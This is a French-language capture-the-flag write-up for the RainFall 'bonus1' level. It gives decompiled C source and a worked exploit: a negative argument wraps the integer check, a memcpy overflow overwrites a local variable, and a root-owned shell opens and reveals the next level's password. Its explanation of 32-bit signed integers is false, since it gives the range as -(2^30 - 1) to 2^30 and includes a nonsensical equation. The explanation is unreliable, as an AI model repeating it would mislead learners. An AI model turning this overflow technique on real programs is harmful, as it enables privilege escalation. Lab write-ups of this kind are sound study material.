# Bonus1

pass : `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`

## Sources :

```c=
#include <stdlib.h>
#include <string.h>

int		main(int ac, char **av) {
	char str[40];  // esp+0x14  --  size : 0x3c - 0x14
	int nb;  // esp+0x3c

	nb = atoi(av[1]);
	if (nb > 9) {
		return 1;
	}
	memcpy(str, av[2], 4 * nb);
	if (nb == 0x574f4c46) {
		execl("/bin/sh", "sh", 0);
	}
	return 0;
}
```

## Recherche :

Pour changer la valeur de `nb`, il faudrait écrire suffisament loin sur `str`, exactement au 40<sup>ème</sup> caractère.

Le problème, c'est que `nb` ne peut pas dépasser 9.

Mais c'est pas très grave, car les int sont circulaires, en effet quand on passe le plus grand int, on arrive au plus petit.

On voudrait mettre `nb == 11` pour réécrire dessus.

on est en **32bit**, du coup les int sont codés entre `0x00000000` et `0xffffffff`, ce qui fait `2^32 - 1` valeures possibles. Comme ils sont signé, c’est divisé par 2, le plus petit int, c’est `-(2^30 - 1)` et le plus grand `2^30`
Du coup `-(2^30 - 1) - 2^30  == 0`
```python
>>> -(2**30 - 1) - (2**30) + 11
-2147483636
```

## Exploit :

```shell=
bonus1@RainFall:~$ ./bonus1 -2147483636 $(perl -e 'print "A"x40 . "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cd ../bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
